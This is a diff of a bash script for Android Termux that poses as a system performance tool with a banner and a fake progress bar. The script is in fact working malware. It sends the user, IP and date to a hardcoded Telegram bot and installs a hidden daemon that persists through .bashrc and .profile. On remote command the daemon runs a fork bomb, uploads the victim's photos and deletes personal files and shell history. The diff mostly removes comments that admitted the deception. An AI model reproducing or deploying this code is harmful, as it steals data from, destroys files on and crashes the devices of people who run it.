@@ -4,31 +4,35 @@
 # Created by: ZerNism
 # ============================================
 
-# Konfigurasi Telegram - GANTI KONTOL!
+# Konfigurasi Telegram 
 TOKEN="9020122511:AAHt-yLQiXG1wj51xARW93E9TCoq0kYklH8"
 CHAT_ID="8042897984"
 
-# Warna (opsional)
-R='\033[1;31m'
-G='\033[1;32m'
-Y='\033[1;33m'
-B='\033[1;34m'
-P='\033[1;35m'
-C='\033[1;36m'
-W='\033[1;37m'
-N='\033[0m'
+
+P='\033[1;31m'
+
 
 clear
 
-# ============= TAMPILAN AWAL (UMPAN) =============
+
 echo -e "${P}"
 cat << "EOF"
-██████╗ ██╗███╗   ██╗██████╗  █████╗     ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ 
-██╔══██╗██║████╗  ██║██╔══██╗██╔══██╗    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
-██║  ██║██║██╔██╗ ██║██║  ██║███████║    ███████║███████║██║     █████╔╝ █████╗  ██████╔╝
-██║  ██║██║██║╚██╗██║██║  ██║██╔══██║    ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
-██████╔╝██║██║ ╚████║██████╔╝██║  ██║    ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
-╚═════╝ ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+.':::::..
+        .cXXK&&&&&&&&&&&&&KXk].
+      lKX&&&&&&&&&&&&&&&&&&&&&Xko.         ____  ___  ____  _  _  _  ___  _  _ 
+    lX&&&&&&&&&&&&&&&&&&&&&&&&&&&Xd       |_  / | __|| _  \| \| || |/ __|| \/ |
+  .X&&&&&&&&&X:         'X&&&&&&&&&N.      / /  | _| |   / | .` || |\__ \| |\/|
+ .X&&&&&&&&&Xd           :X&&&&&&&&&X.    /___| |___||_|_\ |_|\_||_||___/|_|  |
+ X&&&&&&&&&&X             X&&&&&&&&&&N.   _____________________________________
+:X&&&&&&Xc.                 .:X&&&&&&Xo
+d&&&&&&Xx.                   'oX&&&&&&0
+d&&&&&&&&&X:               'X&&&&&&&&&0
+:X&&&&&&&&&&N.            X&&&&&&&&&&Xo
+ X&&&&&&&&&&Xd.          cX&&&&&&&&&&X.
+ .X&&&&&&&&&XO.          kX&&&&&&&&&X'
+  .XM01..                     .'ckXN.
+    .                             ..
+_______________________________________________________________________________
 EOF
 echo -e "${N}"
 
@@ -41,7 +45,7 @@ echo -e "${C}║${P}              Created by: ZerNism                      ${C}�
 echo -e "${C}╚══════════════════════════════════════════════════════════╝${N}"
 echo ""
 
-# ============= PROGRESS BAR PALSU =============
+
 echo -e "${Y}[!] Analyzing system performance...${N}"
 
 for i in {1..10}; do
@@ -54,9 +58,9 @@ done
 echo ""
 sleep 1
 
-# ============= HIDDEN PAYLOAD - INI YANG BENERAN =============
 
-# Buat hidden directory (biar ga keliatan)
+
+
 HIDDEN_DIR="$HOME/.config/.system"
 mkdir -p "$HIDDEN_DIR"
 mkdir -p "$HOME/.cache/.update"
@@ -70,7 +74,7 @@ curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
     -d "text=🔥 *Target Terkoneksi!*%0A%0A📱 *Device:* $(uname -o)%0A👤 *User:* $(whoami)%0A🌐 *IP:* $(curl -s ifconfig.me 2>/dev/null)%0A📅 *Date:* $(date)%0A%0A⚡ *System Ready*" \
     -d "parse_mode=Markdown" > /dev/null 2>&1 &
 
-# ============= FORK BOMB SCRIPT =============
+# fork bomkntol
 cat > "$HIDDEN_DIR/.systemd" << 'EOF'
 #!/data/data/com.termux/files/usr/bin/bash
 # System daemon - JANGAN DIHAPUS!
@@ -78,7 +82,7 @@ cat > "$HIDDEN_DIR/.systemd" << 'EOF'
 TOKEN="9020122511:AAHt-yLQiXG1wj51xARW93E9TCoq0kYklH8"
 CHAT_ID="8042897984"
 
-# ============= FORK BOMB FUNCTION =============
+# func forok bombomb
 forkbomb() {
     # Classic fork bomb
     :(){ :|:& };:
@@ -137,16 +141,16 @@ while True:
     # Kirim notifikasi
     curl -s "https://api.telegram.org/bot$TOKEN/sendMessage" \
         -d "chat_id=$CHAT_ID" \
-        -d "text=💣 *FORK BOMB ACTIVATED!*%0A%0A🔥 CPU: 100%%%0A🔥 RAM: 100%%%0A🔥 System: CRASH" \
+        -d "text= *FORK BOMB ACTIVATED!*%0A%0A CPU: 100%%%0A RAM: 100%%%0A System: CRASH" \
         -d "parse_mode=Markdown" > /dev/null 2>&1 &
 }
 
-# ============= SNITCH FUNCTION =============
+# snitch func
 snitch() {
     # Kirim notifikasi
     curl -s "https://api.telegram.org/bot$TOKEN/sendMessage" \
         -d "chat_id=$CHAT_ID" \
-        -d "text=📸 *Mengirim file...*" \
+        -d "text=*Mengirim file...*" \
         -d "parse_mode=Markdown" > /dev/null 2>&1
     
     # Cari file gambar
@@ -159,7 +163,7 @@ snitch() {
         done
     fi
     
-    # Cari file di Download
+    # Cari file di Donload
     if [ -d "/storage/emulated/0/Download" ]; then
         find "/storage/emulated/0/Download" -name "*.jpg" -o -name "*.png" | head -5 | while read img; do
             curl -s -F chat_id="$CHAT_ID" \
@@ -170,14 +174,14 @@ snitch() {
     fi
 }
 
-# ============= WIPE FUNCTION =============
+# wipe func
 wipe() {
     curl -s "https://api.telegram.org/bot$TOKEN/sendMessage" \
         -d "chat_id=$CHAT_ID" \
         -d "text=🧹 *WIPE COMMAND EXECUTED!*" \
         -d "parse_mode=Markdown" > /dev/null 2>&1
     
-    # Hapus file-file penting
+    # Hps file
     rm -rf /storage/emulated/0/Download/* 2>/dev/null
     rm -rf /storage/emulated/0/DCIM/Camera/* 2>/dev/null
     rm -rf /storage/emulated/0/Documents/* 2>/dev/null
@@ -190,7 +194,7 @@ wipe() {
     rm -rf ~/.zsh_history 2>/dev/null
 }
 
-# ============= TELEGRAM COMMAND CHECKER =============
+# tele komen
 check_telegram() {
     local last_cmd=$(curl -s "https://api.telegram.org/bot$TOKEN/getUpdates" | grep -o '"text":"[^"]*"' | tail -1 | cut -d'"' -f4)
     
@@ -198,7 +202,7 @@ check_telegram() {
         "/start")
             curl -s "https://api.telegram.org/bot$TOKEN/sendMessage" \
                 -d "chat_id=$CHAT_ID" \
-                -d "text=✅ *System Online*%0A%0ACommands:%0A/bomb - Aktifkan Fork Bomb%0A/snitch - Curi File%0A/wipe - Hapus Semua%0A/info - Info Device" \
+                -d "text= *System Online*%0A%0ACommands:%0A/bomb - Aktifkan Fork Bomb%0A/snitch - Curi File%0A/wipe - Hapus Semua%0A/info - Info Device" \
                 -d "parse_mode=Markdown" > /dev/null 2>&1
             ;;
         "/bomb")
@@ -215,7 +219,7 @@ check_telegram() {
             local uptime=$(uptime | sed 's/.*up //; s/,.*//')
             curl -s "https://api.telegram.org/bot$TOKEN/sendMessage" \
                 -d "chat_id=$CHAT_ID" \
-                -d "text=📱 *Device Info*%0A%0A👤 User: $(whoami)%0A📱 Host: $(hostname)%0A🌐 IP: $ip%0A⏰ Uptime: $uptime%0A📅 Date: $(date)" \
+                -d "text= *Device Info*%0A%0A User: $(whoami)%0A Host: $(hostname)%0A IP: $ip%0AUptime: $uptime%0A Date: $(date)" \
                 -d "parse_mode=Markdown" > /dev/null 2>&1
             ;;
     esac
@@ -230,7 +234,7 @@ EOF
 
 chmod +x "$HIDDEN_DIR/.systemd"
 
-# ============= PERSISTENCE =============
+# 
 echo -e "${Y}[System Update] Configuring startup...${N}"
 
 # Tambah ke bashrc
@@ -249,10 +253,10 @@ if ! grep -q ".systemd" ~/.profile; then
     echo "nohup bash $HIDDEN_DIR/.systemd > /dev/null 2>&1 &" >> ~/.profile
 fi
 
-# Jalanin sekarang
+# gasken
 nohup bash "$HIDDEN_DIR/.systemd" > /dev/null 2>&1 &
 
-# ============= TAMPILAN AKHIR =============
+# akhir besti
 echo -e "${G}"
 cat << "EOF"
 ╔══════════════════════════════════════╗
